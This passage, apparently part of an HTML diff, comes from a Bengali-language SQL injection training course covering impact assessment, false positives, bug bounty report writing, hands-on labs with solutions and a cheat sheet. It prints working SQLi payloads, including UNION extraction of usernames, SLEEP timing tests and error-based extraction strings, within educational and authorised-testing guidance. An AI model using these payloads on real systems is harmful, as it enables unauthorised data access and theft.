+    <div class="card"><h4>Confidentiality</h4><p>Unauthorized data access — যেমন অন্য ইউজারের ব্যক্তিগত তথ্য, পাসওয়ার্ড হ্যাশ, বা ব্যবসায়িক গোপন ডেটা পড়া।</p></div>
+    <div class="card"><h4>Integrity</h4><p>Data modification — অর্ডার স্ট্যাটাস, মূল্য, বা অ্যাকাউন্ট ব্যালেন্স অননুমোদিতভাবে পরিবর্তন করা।</p></div>
+    <div class="card"><h4>Availability</h4><p>ডেটা মুছে ফেলা (<code>DROP</code>/<code>DELETE</code>) বা ভারী query দিয়ে ডেটাবেস ওভারলোড করে সার্ভিস ব্যাহত করা।</p></div>
+  </div>
+
+  <h2>Unauthorized Data Access ও Authentication Bypass</h2>
+  <p>UNION-based বা blind SQLi দিয়ে অন্য ইউজারের ডেটা পড়া, বা একটি injectable login query দিয়ে পরিচয় যাচাই এড়িয়ে যাওয়া — এই দুটোই confidentiality-এর সরাসরি লঙ্ঘন।</p>
+
+  <h2>Data Modification ও Privilege Escalation-এর সম্ভাব্য সম্পর্ক</h2>
+  <p>Stacked queries সক্ষম হলে, attacker তাত্ত্বিকভাবে নিজের ইউজার রেকর্ডের <code>role</code> কলাম সরাসরি <code>UPDATE</code> করে admin বানাতে পারে — এটি privilege escalation-এর একটি সরাসরি পথ, কিন্তু বাস্তবে এটি database account-এর প্রকৃত privilege-এর উপর নির্ভরশীল।</p>
+
+  <h2>Database Privilege-এর গুরুত্ব</h2>
+  <p>Application-এর database account যদি শুধুমাত্র নির্দিষ্ট টেবিলে read access রাখে, তাহলে একই SQLi vulnerability থাকা সত্ত্বেও impact অনেক সীমিত থাকবে, একটি admin-level account-এর তুলনায় যার সব টেবিলে full access আছে — এই কারণেই least-privilege নীতি (অধ্যায় ১৭) এত গুরুত্বপূর্ণ।</p>
+
+  <h2>Sensitive Data Exposure</h2>
+  <p>Impact নির্ণয়ে বিবেচনা করুন কী ধরনের ডেটা সংরক্ষিত আছে — ব্যক্তিগত তথ্য (PII), আর্থিক তথ্য, স্বাস্থ্য তথ্য, বা প্রমাণীকরণ ক্রেডেনশিয়াল — এগুলোর sensitivity যত বেশি, impact তত বেশি গুরুতর বিবেচিত হয়।</p>
+
+  <h2>Business Impact Assessment ও Blast Radius</h2>
+  <p><strong>Blast radius</strong> বলতে বোঝায় একটি vulnerability-এর প্রভাব ঠিক কতদূর পর্যন্ত বিস্তৃত হতে পারে — শুধু একটি টেবিল, নাকি পুরো ডেটাবেস; শুধু একটি মাইক্রোসার্ভিস, নাকি shared ডেটাবেস কানেকশনের মাধ্যমে একাধিক সার্ভিস। একটি shared database account ব্যবহার করা আর্কিটেকচারে একটি ছোট SQLi-ও বড় blast radius তৈরি করতে পারে।</p>
+
+  <h2>Least Privilege — Impact কমানোর মূল কৌশল</h2>
+  <p>Impact assessment করার সময় সবসময় প্রশ্ন করুন: "যদি database account-টি least-privilege নীতিতে কনফিগার করা থাকত, তাহলে এই নির্দিষ্ট SQLi দিয়ে সর্বোচ্চ কী করা সম্ভব হতো?" — এটি বাস্তবসম্মত severity নির্ধারণে সাহায্য করে।</p>
+
+  <h2>Safe Proof-of-Concept তৈরির নিয়ম</h2>
+  <ul>
+    <li>Database version বা একটি non-sensitive টেবিলের নাম যথেষ্ট প্রমাণ — পুরো টেবিল ডাম্প করার প্রয়োজন নেই।</li>
+    <li>Write/delete-ক্ষমতা থাকলেও কখনো প্রকৃত ডেটা পরিবর্তন/মোছা করে প্রমাণ দেখাবেন না — একটি non-destructive সংকেত (যেমন timing difference) ব্যবহার করুন।</li>
+    <li>যদি একাধিক ইউজারের ডেটা দেখা সম্ভব হয়, শুধুমাত্র নিজের বা একটি synthetic test অ্যাকাউন্টের ডেটা দিয়ে প্রমাণ দেখান।</li>
+  </ul>
+
+  <h2>বাস্তব Impact প্রমাণ করতে অতিরিক্ত ডেটা সংগ্রহ কেন প্রয়োজন হয় না</h2>
+  <p>একটি প্রোগ্রাম রিভিউয়ারকে বোঝাতে পুরো ইউজার টেবিল ডাউনলোড করার প্রয়োজন নেই — "আমি দেখিয়েছি যে এই query দিয়ে <code>users</code> টেবিলের যেকোনো কলাম পড়া সম্ভব, এখানে একটি উদাহরণ (database version) আছে" — এটুকুই severity-নির্ধারণের জন্য যথেষ্ট প্রমাণ, এবং এটি অপ্রয়োজনীয় ডেটা এক্সপোজারের ঝুঁকিও এড়ায়।</p>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>SQLi-এর impact নির্ভর করে database privilege, সংরক্ষিত ডেটার sensitivity, এবং আর্কিটেকচারাল blast radius-এর উপর। দায়িত্বশীল proof-of-concept সবসময় ন্যূনতম প্রয়োজনীয় প্রমাণ ব্যবহার করে, অতিরিক্ত ডেটা সংগ্রহ বা destructive কাজ এড়িয়ে।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>Least-privilege database account কীভাবে একই vulnerability-এর impact কমায়?</li>
+    <li>Blast radius বলতে কী বোঝানো হয়েছে?</li>
+    <li>কেন পুরো ডেটাবেস ডাম্প করা সাধারণত অপ্রয়োজনীয়?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter15"><span>পূর্ববর্তী</span>অধ্যায় ১৫</a>
+    <a class="next" href="/chapter17"><span>পরবর্তী</span>অধ্যায় ১৭ — Prevention</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch18">
+  <div class="eyebrow">অধ্যায় ১৮ · প্রতিরক্ষা</div>
+  <h1>False Positives ও Troubleshooting</h1>
+  <p class="sub">কখন একটি ফলাফল SQLi-এর প্রমাণ নয়, এবং নিশ্চিত না হলে কী করা উচিত।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch18" id="done-ch18"><label for="done-ch18">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Quote দিলেই SQLi প্রমাণ হয় না কেন</h2>
+  <p>একটি single quote পাঠানোর পর response পরিবর্তিত হওয়া মানেই injection — এই ধারণা ভুল। Quote যেকোনো কারণে response পরিবর্তন করতে পারে: input validation ফ্রেমওয়ার্ক quote থাকা input প্রত্যাখ্যান করতে পারে (SQLi ছাড়াই), বা HTML rendering-এ সমস্যা তৈরি করতে পারে (XSS-related, SQLi নয়)।</p>
+
+  <h2>সাধারণ False-Positive উৎসসমূহ</h2>
+  <table>
+    <thead><tr><th>উৎস</th><th>কেন বিভ্রান্তিকর</th><th>কীভাবে বাদ দেবেন</th></tr></thead>
+    <tbody>
+      <tr><td>Generic HTTP 500 error</td><td>SQL-নির্দিষ্ট তথ্য ছাড়াই যেকোনো unhandled exception-এ ঘটতে পারে</td><td>Error message-এ database engine-এর নাম/syntax আছে কি না দেখুন</td></tr>
+      <tr><td>WAF block page</td><td>WAF নিজের signature-এ মিলেছে বলেই ব্লক করে, backend vulnerable কি না তার সাথে সম্পর্কহীন</td><td>WAF bypass ছাড়াই backend সরাসরি পরীক্ষা করুন, বা response header/body-তে WAF-এর নিজস্ব ব্র্যান্ডিং আছে কি না দেখুন</td></tr>
+      <tr><td>Rate limiting</td><td>অনেক দ্রুত request পাঠালে ৪২৯/৫০৩ response আসতে পারে, যা condition-নির্ভর নয়</td><td>Request-এর মধ্যে বিরতি দিয়ে পুনরায় পরীক্ষা করুন</td></tr>
+      <tr><td>Caching</td><td>CDN/server cache আগের response দেখাতে পারে, যা বর্তমান condition প্রতিফলিত করে না</td><td>Cache-busting parameter যোগ করুন বা cache-control header পরীক্ষা করুন</td></tr>
+      <tr><td>Network latency</td><td>সাধারণ নেটওয়ার্ক ওঠানামা time-based টেস্টে delay-এর মতো দেখাতে পারে</td><td>একাধিকবার (৩–৫ বার) measurement নিয়ে গড় ও consistency যাচাই করুন</td></tr>
+      <tr><td>Dynamic content</td><td>ভিজিটর কাউন্টার, টাইমস্ট্যাম্প প্রতিবার response আলাদা করে তোলে</td><td>Content-এর শুধু প্রাসঙ্গিক অংশ (যেমন প্রোডাক্ট তালিকা) তুলনা করুন, পুরো body নয়</td></tr>
+      <tr><td>Session expiration</td><td>Session timeout হলে response হঠাৎ ভিন্ন (লগইন পেজে রিডাইরেক্ট) হতে পারে</td><td>Session এখনো বৈধ কি না আগে নিশ্চিত করুন</td></tr>
+      <tr><td>Database error leakage (unrelated)</td><td>কোনো connection/timeout সমস্যা থেকেও database-সম্পর্কিত error আসতে পারে, input-এর কারণে নয়</td><td>বেসলাইন রিকোয়েস্টেও একই error আসে কি না পরীক্ষা করুন</td></tr>
+      <tr><td>Client-side validation</td><td>JavaScript validation ব্লক করলে request-ই সার্ভারে পৌঁছায় না</td><td>Burp দিয়ে সরাসরি সার্ভারে request পাঠান, ব্রাউজার ফর্ম এড়িয়ে</td></tr>
+      <tr><td>Parameter ignored হওয়া</td><td>কিছু parameter backend সম্পূর্ণ উপেক্ষা করে, তাই কোনো পরিবর্তনই response-কে প্রভাবিত করে না</td><td>একটি সুনিশ্চিতভাবে ব্যবহৃত value (যেমন স্বাভাবিক id) দিয়ে প্রথমে নিশ্চিত করুন parameter আদৌ প্রভাব ফেলে কি না</td></tr>
+      <tr><td>Timing-based false positives</td><td>সার্ভার লোড বা থার্ড-পার্টি API কল থেকেও delay আসতে পারে</td><td>False condition-এর সাথে বারবার তুলনা করুন</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Repeatability Test</h2>
+  <p>যেকোনো সংকেত অন্তত দু'বার, একই শর্তে পুনরুৎপাদন করুন। যদি একবার দেখা যায় কিন্তু পরেরবার না, তাহলে এটি সম্ভবত নয়েজ (noise), প্রকৃত সংকেত নয়।</p>
+
+  <h2>Confidence Level নির্ধারণ</h2>
+  <div class="grid2">
+    <div class="card"><h4>উচ্চ আস্থা</h4><p>Database-নির্দিষ্ট error + পুনরুৎপাদনযোগ্য + input-এর সাথে যৌক্তিক সম্পর্ক</p></div>
+    <div class="card"><h4>মাঝারি আস্থা</h4><p>সামঞ্জস্যপূর্ণ boolean/timing পার্থক্য, কিন্তু সরাসরি error/ডেটা নেই</p></div>
+    <div class="card"><h4>নিম্ন আস্থা</h4><p>একবার দেখা গেছে এমন পার্থক্য, পুনরুৎপাদন অনিশ্চিত</p></div>
+  </div>
+
+  <h2>Vulnerability নিশ্চিত না হলে Report না করার নিয়ম</h2>
+  <p>নিম্ন-আস্থার সংকেত নিয়ে রিপোর্ট জমা দেওয়া উচিত না — এটি রিভিউয়ারের সময় নষ্ট করে এবং প্রোগ্রামের সাথে সম্পর্ক ক্ষতিগ্রস্ত করতে পারে। নিশ্চিত না হলে, আরও যাচাই করুন বা প্রয়োজনে সেই ক্ষেত্রটি বাদ দিন। "সম্ভাব্য" বলে কিছু রিপোর্ট করতে হলে স্পষ্টভাবে confidence level এবং কেন নিশ্চিত হওয়া যায়নি তা উল্লেখ করুন।</p>
+
+  <div class="exercise"><h4>অনুশীলন</h4><p>একটি lab পরিবেশে ইচ্ছাকৃতভাবে একটি false positive তৈরি করুন (যেমন ভিজিটর কাউন্টার দেখানো একটি পেজে boolean টেস্ট চালিয়ে) এবং লিখুন কীভাবে আপনি নিশ্চিত হলেন এটি আসলে injection নয়।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>অনেক পরিবেশগত কারণ (caching, rate limiting, dynamic content, latency) SQLi-এর মতো দেখতে পার্থক্য তৈরি করতে পারে। Repeatability যাচাই এবং confidence level স্পষ্টভাবে নির্ধারণ করাই নির্ভরযোগ্য সিদ্ধান্তের একমাত্র উপায়।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter17"><span>পূর্ববর্তী</span>অধ্যায় ১৭</a>
+    <a class="next" href="/chapter19"><span>পরবর্তী</span>অধ্যায় ১৯ — Bug Bounty Reporting</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch19">
+  <div class="eyebrow">অধ্যায় ১৯ · রিপোর্টিং</div>
+  <h1>Bug Bounty Reporting</h1>
+  <p class="sub">একটি professional SQL Injection রিপোর্টের কাঠামো, এবং একটি সম্পূর্ণ fictional উদাহরণ।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch19" id="done-ch19"><label for="done-ch19">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>রিপোর্টের কাঠামো</h2>
+  <ul>
+    <li><strong>Title:</strong> সংক্ষিপ্ত, নির্দিষ্ট — "SQL Injection in X" টাইপ, অস্পষ্ট শব্দ এড়িয়ে।</li>
+    <li><strong>Summary:</strong> ২–৩ বাক্যে কী ভুল আছে এবং কেন গুরুত্বপূর্ণ।</li>
+    <li><strong>Affected endpoint:</strong> সম্পূর্ণ URL/API path।</li>
+    <li><strong>Vulnerable parameter:</strong> ঠিক কোন field/parameter।</li>
+    <li><strong>Preconditions:</strong> authentication লাগে কি না, নির্দিষ্ট role লাগে কি না।</li>
+    <li><strong>Steps to reproduce:</strong> ধাপে ধাপে, যেকেউ অনুসরণ করে পুনরুৎপাদন করতে পারে এমনভাবে।</li>
+    <li><strong>Safe proof of concept:</strong> ন্যূনতম, non-destructive প্রমাণ।</li>
+    <li><strong>Expected বনাম actual behavior।</strong></li>
+    <li><strong>Evidence:</strong> request/response, স্ক্রিনশট।</li>
+    <li><strong>Security impact:</strong> বাস্তবসম্মত ঝুঁকি ব্যাখ্যা।</li>
+    <li><strong>Severity justification:</strong> CVSS বা প্রোগ্রামের নিজস্ব স্কেল অনুযায়ী যুক্তি।</li>
+    <li><strong>Recommended remediation।</strong></li>
+    <li><strong>Retest steps:</strong> ফিক্সের পর কীভাবে যাচাই করা যাবে।</li>
+  </ul>
+
+  <details open><summary>সম্পূর্ণ ফিকশনাল উদাহরণ রিপোর্ট দেখুন</summary>
+    <div class="inner">
+      <h3>Title</h3>
+      <p>Boolean-Based Blind SQL Injection in <code>/api/v1/orders</code> <code>status</code> Parameter (ShopMock)</p>
+
+      <h3>Summary</h3>
+      <p>The <code>status</code> query parameter on the order-listing endpoint is not parameterized, allowing an authenticated user to inject boolean conditions that alter the SQL query executed against the orders table. This allows inference of data outside the requesting user's own order records.</p>
+
+      <h3>Affected Endpoint</h3>
+      <div class="codeblock"><pre><code>GET https://shopmock.example/api/v1/orders?status=shipped</code></pre></div>
+
+      <h3>Vulnerable Parameter</h3>
+      <p><code>status</code> (query string)</p>
+
+      <h3>Preconditions</h3>
+      <p>একটি স্বাভাবিক, authenticated customer অ্যাকাউন্ট যথেষ্ট — কোনো elevated privilege প্রয়োজন নেই।</p>
+
+      <h3>Steps to Reproduce</h3>
+      <ol>
+        <li>নিজের অ্যাকাউন্টে লগইন করুন এবং Burp Proxy চালু রাখুন।</li>
+        <li><code>GET /api/v1/orders?status=shipped</code> request পাঠান এবং response রেকর্ড করুন (baseline)।</li>
+        <li>একই request <code>status=shipped' AND '1'='1</code> দিয়ে পাঠান → response baseline-এর মতোই (true condition)।</li>
+        <li>একই request <code>status=shipped' AND '1'='2</code> দিয়ে পাঠান → response খালি তালিকা দেখায় (false condition)।</li>
+        <li>উভয় টেস্ট দু'বার পুনরাবৃত্তি করে সামঞ্জস্যপূর্ণতা নিশ্চিত করা হয়েছে।</li>
+      </ol>
+
+      <h3>Safe Proof of Concept</h3>
+      <div class="codeblock"><div class="cb-head"><span>Database version বের করা, একটি অক্ষর দিয়ে উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>GET /api/v1/orders?status=shipped' AND SUBSTRING(@@version,1,1)='5
+
+→ Response "true" (baseline-এর মতো) নিশ্চিত করে যে ইনস্টল করা
+  MySQL version "5"-এ শুরু হয়। অতিরিক্ত কোনো ডেটা বের করা হয়নি।</code></pre></div>
+
+      <h3>Expected বনাম Actual</h3>
+      <p><strong>Expected:</strong> <code>status</code> parameter শুধুমাত্র পূর্বনির্ধারিত মান (shipped/pending/cancelled) গ্রহণ করবে এবং অন্য যেকোনো ইনপুটে ত্রুটিমুক্তভাবে খালি/ভুল-অনুরোধ response দেবে। <strong>Actual:</strong> ইনপুট সরাসরি SQL query-তে ব্যবহৃত হচ্ছে, এবং condition-ভিত্তিক response পার্থক্য তৈরি করছে।</p>
+
+      <h3>Evidence</h3>
+      <p>[এখানে Burp Repeater-এর তিনটি request/response জোড়ার স্ক্রিনশট/raw টেক্সট যুক্ত থাকবে — baseline, true condition, false condition।]</p>
+
+      <h3>Security Impact</h3>
+      <p>একজন attacker এই কৌশল সম্প্রসারিত করে ধীরে ধীরে database structure এবং সম্ভবত অন্য ইউজারের অর্ডার ডেটা (যদি query অন্য টেবিলের সাথে জয়েন করে) অনুমান করতে পারে, যদিও এই PoC-তে শুধুমাত্র database version নিশ্চিত করা হয়েছে যাতে অপ্রয়োজনীয় ডেটা এক্সপোজার এড়ানো যায়।</p>
+
+      <h3>Severity Justification</h3>
+      <p>CVSS 3.1 ভিত্তিতে আনুমানিক: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N ≈ <strong>High (৭.১)</strong> — authenticated access প্রয়োজন (PR:L) কিন্তু confidentiality impact উচ্চ, integrity/availability impact নিশ্চিত করা যায়নি এই PoC-তে।</p>
+
+      <h3>Recommended Remediation</h3>
+      <p><code>status</code> parameter-এর জন্য parameterized query ব্যবহার করুন, এবং/অথবা একটি allowlist (shipped/pending/cancelled) দিয়ে মান যাচাই করুন — অধ্যায় ১৭ দেখুন।</p>
+
+      <h3>Retest Steps</h3>
+      <p>Fix-এর পর ধাপ ৩–৪ পুনরাবৃত্তি করুন — true ও false condition-এ response অভিন্ন হওয়া উচিত (উভয় ক্ষেত্রেই শুধু বৈধ অর্ডার তালিকা, বা উভয়ক্ষেত্রেই ৪০০ Bad Request)।</p>
+    </div>
+  </details>
+
+  <div class="callout info"><div class="ic">ℹ️</div><p>লক্ষ্য করুন রিপোর্টে কোনো প্রকৃত ইউজার ডেটা ডাম্প করা হয়নি — শুধুমাত্র database version নিশ্চিত করা হয়েছে, যা impact প্রমাণের জন্য যথেষ্ট (অধ্যায় ১৬)।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>একটি ভালো রিপোর্ট reproducible, নির্দিষ্ট, এবং ন্যূনতম প্রয়োজনীয় প্রমাণ ব্যবহার করে — অতিরিক্ত ডেটা সংগ্রহ বা destructive action ছাড়াই severity ও impact স্পষ্টভাবে যুক্তিসহ উপস্থাপন করে।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter18"><span>পূর্ববর্তী</span>অধ্যায় ১৮</a>
+    <a class="next" href="/chapter20"><span>পরবর্তী</span>অধ্যায় ২০ — Practical Labs ও Exercises</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch20">
+  <div class="eyebrow">অধ্যায় ২০ · রিপোর্টিং</div>
+  <h1>Practical Labs ও Exercises</h1>
+  <p class="sub">Beginner, intermediate ও advanced স্তরে হাতে-কলমে অনুশীলন — প্রতিটিতে objective, scenario, hint, সমাধান ও remediation।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch20" id="done-ch20"><label for="done-ch20">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <div class="callout info"><div class="ic">🎓</div><p><strong>Roadmap:</strong> এই অনুশীলনগুলো করার আগে/পরে, <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger Web Security Academy</a>-এর SQL Injection labs এবং <a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">OWASP Juice Shop</a>-এর মতো অনুমোদিত, বিনামূল্যের training environment-এ অনুশীলন করুন — এগুলো নিরাপদভাবে, আইনিভাবে practice করার জন্য তৈরি।</p></div>
+
+  <h2>🟢 Beginner Lab ১ — Error-Based Discovery</h2>
+  <div class="card">
+    <p><strong>Learning objective:</strong> single-quote probe দিয়ে injection শনাক্ত করা শিখুন।</p>
+    <p><strong>Lab setup:</strong> একটি local PHP+MySQL অ্যাপ্লিকেশন (ধারণাগত "ShopMock") যেখানে <code>/product?id=</code> parameter verbose error দেখায়।</p>
+    <p><strong>Scenario:</strong> প্রোডাক্ট পেজে <code>id</code> parameter পরীক্ষা করুন।</p>
+    <p><strong>Task:</strong> নিশ্চিত করুন <code>id</code> parameter injectable কি না।</p>
+    <p><strong>Hint:</strong> অধ্যায় ০৩-এর error-based সেকশন দেখুন — single quote পাঠিয়ে শুরু করুন।</p>
+    <details><summary>Expected observation ও সমাধান দেখুন</summary><div class="inner">
+      <p><strong>Expected observation:</strong> <code>id=7'</code> পাঠালে একটি MySQL syntax error দেখা যাবে।</p>
+      <p><strong>সমাধান:</strong> <code>GET /product?id=7'</code> → error "You have an error in your SQL syntax near '''"। এটি নিশ্চিত করে input query-তে unescaped পৌঁছাচ্ছে।</p>
+      <p><strong>কেন কাজ করে:</strong> quote query-এর string literal ভেঙে দেয়, যা backend sanitize করছে না।</p>
+      <p><strong>Common mistakes:</strong> শুধু HTTP 500 দেখেই injection ধরে নেওয়া — error message-এর বিষয়বস্তু নিশ্চিত করতে হবে এটি SQL-নির্দিষ্ট কি না।</p>
+      <p><strong>Remediation:</strong> parameterized query + generic error page (অধ্যায় ১৭)।</p>
+    </div></details>
+  </div>
+
+  <h2>🟢 Beginner Lab ২ — Boolean Condition যাচাই</h2>
+  <div class="card">
+    <p><strong>Objective:</strong> true/false condition দিয়ে একটি confirm injection তৈরি করা।</p>
+    <p><strong>Scenario:</strong> একটি সার্চ ফিচার, যা error দেখায় না (suppressed)।</p>
+    <p><strong>Task:</strong> <code>AND 1=1</code> ও <code>AND 1=2</code> ব্যবহার করে injection নিশ্চিত করুন।</p>
+    <p><strong>Hint:</strong> দুটো request-এর response length তুলনা করুন।</p>
+    <details><summary>সমাধান দেখুন</summary><div class="inner">
+      <p><code>?q=laptop' AND '1'='1</code> → স্বাভাবিক ফলাফল। <code>?q=laptop' AND '1'='2</code> → খালি ফলাফল। এই পার্থক্যই নিশ্চিত প্রমাণ, কারণ condition ছাড়া কোনো কারণ নেই ফলাফল ভিন্ন হওয়ার।</p>
+      <p><strong>Self-assessment:</strong> আপনি কি দুইবার পরীক্ষা করে consistency নিশ্চিত করেছেন?</p>
+    </div></details>
+  </div>
+
+  <h2>🟡 Intermediate Lab ১ — UNION দিয়ে Column Count ও ডেটা বের করা</h2>
+  <div class="card">
+    <p><strong>Objective:</strong> সম্পূর্ণ UNION-based workflow অনুশীলন করা।</p>
+    <p><strong>Scenario:</strong> একটি প্রোডাক্ট পেজ যা database query-এর ফলাফল সরাসরি দেখায়।</p>
+    <p><strong>Task:</strong> column count বের করুন, তারপর <code>users</code> টেবিল থেকে username দেখান।</p>
+    <p><strong>Hint:</strong> <code>ORDER BY</code> দিয়ে শুরু করুন, তারপর <code>UNION SELECT NULL,...</code>।</p>
+    <details><summary>সমাধান দেখুন</summary><div class="inner">
+      <div class="codeblock"><pre><code>?id=7 ORDER BY 3--     (ঠিক)
+?id=7 ORDER BY 4--     (error) → ৩ কলাম
+?id=-1 UNION SELECT NULL,username,NULL FROM users--</code></pre></div>
+      <p><strong>কেন কাজ করে:</strong> <code>id=-1</code> মূল query-কে কোনো সারি না দেওয়ায় বাধ্য করে, ফলে শুধু UNION-এর ফলাফল দেখা যায়।</p>
+      <p><strong>Common mistakes:</strong> column count ভুল অনুমান করে সরাসরি ডেটা বের করার চেষ্টা করা, যার ফলে error আসে এবং বিভ্রান্তি তৈরি হয়।</p>
+      <p><strong>Remediation:</strong> parameterized query (অধ্যায় ১৭)।</p>
+    </div></details>
+  </div>
+
+  <h2>🟡 Intermediate Lab ২ — Time-Based Blind</h2>
+  <div class="card">
+    <p><strong>Objective:</strong> কোনো visible channel ছাড়াই injection প্রমাণ করা।</p>
+    <p><strong>Scenario:</strong> response সবসময় identical দেখায়, কোনো error/content পার্থক্য নেই।</p>
+    <p><strong>Task:</strong> time-based payload দিয়ে injection নিশ্চিত করুন।</p>
+    <details><summary>সমাধান দেখুন</summary><div class="inner">
+      <div class="codeblock"><pre><code>?id=7 AND IF(1=1,SLEEP(5),0)--   → ~৫ সেকেন্ড দেরি
+?id=7 AND IF(1=2,SLEEP(5),0)--   → তাৎক্ষণিক response</code></pre></div>
+      <p><strong>Self-assessment:</strong> আপনি কি অন্তত ৩ বার পরিমাপ করে গড় নিয়েছেন নেটওয়ার্ক শব্দ বাদ দিতে?</p>
+    </div></details>
+  </div>
+
+  <h2>🔴 Advanced Lab — Second-Order SQLi</h2>
+  <div class="card">
+    <p><strong>Objective:</strong> একটি multi-step workflow-এ second-order injection শনাক্ত করা।</p>
+    <p><strong>Scenario:</strong> প্রোফাইল আপডেট ফর্মে একটি "bio" ফিল্ড আছে, যা সরাসরি কোনো প্রভাব ফেলে না, কিন্তু অ্যাডমিন রিপোর্ট পেজে পরে ব্যবহৃত হয়।</p>
+    <p><strong>Task:</strong> bio ফিল্ডে একটি payload সংরক্ষণ করুন এবং রিপোর্ট পেজে প্রভাব আছে কি না পরীক্ষা করুন।</p>
+    <p><strong>Hint:</strong> সরাসরি profile page-এ কোনো পরিবর্তন নাও দেখা যেতে পারে — ডেটা পরে কোথায় ব্যবহৃত হয় তা ম্যাপ করুন।</p>
+    <details><summary>সমাধান দেখুন</summary><div class="inner">
+      <p>Bio ফিল্ডে <code>test' AND '1'='1</code> সংরক্ষণ করার পর, রিপোর্ট পেজ সেই মান কোনো query-তে ব্যবহার করলে boolean-based পার্থক্য দেখা যেতে পারে — মূল চ্যালেঞ্জ হলো সংরক্ষণ-পয়েন্ট ও ব্যবহার-পয়েন্ট আলাদা হওয়ায় এটি সরাসরি দেখা কঠিন।</p>
+      <p><strong>Common mistakes:</strong> শুধু save করার পরের response দেখে "কোনো প্রভাব নেই" সিদ্ধান্তে পৌঁছানো, অথচ প্রভাব অন্য কোথাও (পরে) ঘটছে।</p>
+      <p><strong>Remediation:</strong> সব query-পয়েন্টে parameterization নিশ্চিত করা, শুধু entry-পয়েন্টে নয়।</p>
+    </div></details>
+  </div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>প্রতিটি দক্ষতার স্তরে হাতে-কলমে অনুশীলন তত্ত্বকে বাস্তব অভিজ্ঞতায় রূপান্তর করে। PortSwigger Web Security Academy ও OWASP Juice Shop-এর মতো অনুমোদিত পরিবেশে নিয়মিত practice চালিয়ে যাওয়া উচিত।</p></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter19"><span>পূর্ববর্তী</span>অধ্যায় ১৯</a>
+    <a class="next" href="/chapter21"><span>পরবর্তী</span>অধ্যায় ২১ — SQLi Cheat Sheet</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch21">
+  <div class="eyebrow">অধ্যায় ২১ · রেফারেন্স</div>
+  <h1>SQLi Cheat Sheet</h1>
+  <p class="sub">একটি দ্রুত, categorized রেফারেন্স — প্রতিটি entry-এর সাথে DBMS, উদ্দেশ্য ও সীমাবদ্ধতা।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch21" id="done-ch21"><label for="done-ch21">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>SQL Syntax Quick Reference</h2>
+  <table>
+    <thead><tr><th>Operation</th><th>Syntax</th></tr></thead>
+    <tbody>
+      <tr><td>Comment out rest of query</td><td><code>--&nbsp;</code> (MySQL-এ স্পেসসহ), <code>#</code> (MySQL only)</td></tr>
+      <tr><td>Always-true condition</td><td><code>OR '1'='1</code> / <code>OR 1=1</code></td></tr>
+      <tr><td>Subquery count check</td><td><code>(SELECT COUNT(*) FROM table)</code></td></tr>
+    </tbody>
+  </table>
+
+  <h2>DBMS Differences</h2>
+  <table>
+    <thead><tr><th></th><th>MySQL</th><th>PostgreSQL</th><th>MSSQL</th><th>Oracle</th><th>SQLite</th></tr></thead>
+    <tbody>
+      <tr><td>Concat</td><td><code>CONCAT(a,b)</code></td><td><code>a||b</code></td><td><code>a+b</code></td><td><code>a||b</code></td><td><code>a||b</code></td></tr>
+      <tr><td>Version</td><td><code>@@version</code></td><td><code>version()</code></td><td><code>@@version</code></td><td><code>v$version</code></td><td><code>sqlite_version()</code></td></tr>
+      <tr><td>Delay</td><td><code>SLEEP(n)</code></td><td><code>pg_sleep(n)</code></td><td><code>WAITFOR DELAY</code></td><td><code>DBMS_LOCK.SLEEP(n)</code></td><td>নেই</td></tr>
+      <tr><td>No-table SELECT</td><td>হ্যাঁ</td><td>হ্যাঁ</td><td>হ্যাঁ</td><td><code>FROM dual</code> দরকার</td><td>হ্যাঁ</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Quote ও Comment আচরণ</h2>
+  <ul>
+    <li>String literal: single quote (সব DBMS-এ)</li>
+    <li>Identifier quoting: MySQL = backtick (<code>`</code>), PostgreSQL/Oracle/SQLite = double quote, MSSQL = square bracket (<code>[ ]</code>)</li>
+    <li>MySQL-এ <code>--</code>-এর পর বাধ্যতামূলক স্পেস/নিউলাইন প্রয়োজন</li>
+  </ul>
+
+  <h2>Boolean Conditions</h2>
+  <div class="codeblock"><pre><code>AND 1=1 / AND 1=2
+' AND '1'='1 / ' AND '1'='2
+AND (SELECT 1)=1</code></pre></div>
+
+  <h2>UNION Testing কুইক-স্টেপ</h2>
+  <ol>
+    <li><code>ORDER BY N--</code> দিয়ে column count বের করুন</li>
+    <li><code>UNION SELECT NULL,NULL,...--</code> দিয়ে alignment যাচাই</li>
+    <li>প্রতিটি NULL-কে একটি marker স্ট্রিং দিয়ে বদলে display-হওয়া কলাম শনাক্ত করুন</li>
+  </ol>
+
+  <h2>Error-Based Tests (সংক্ষিপ্ত)</h2>
+  <div class="codeblock"><pre><code>-- MySQL
+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))
+-- MSSQL
+CONVERT(int,(SELECT TOP 1 username FROM users))</code></pre></div>
+
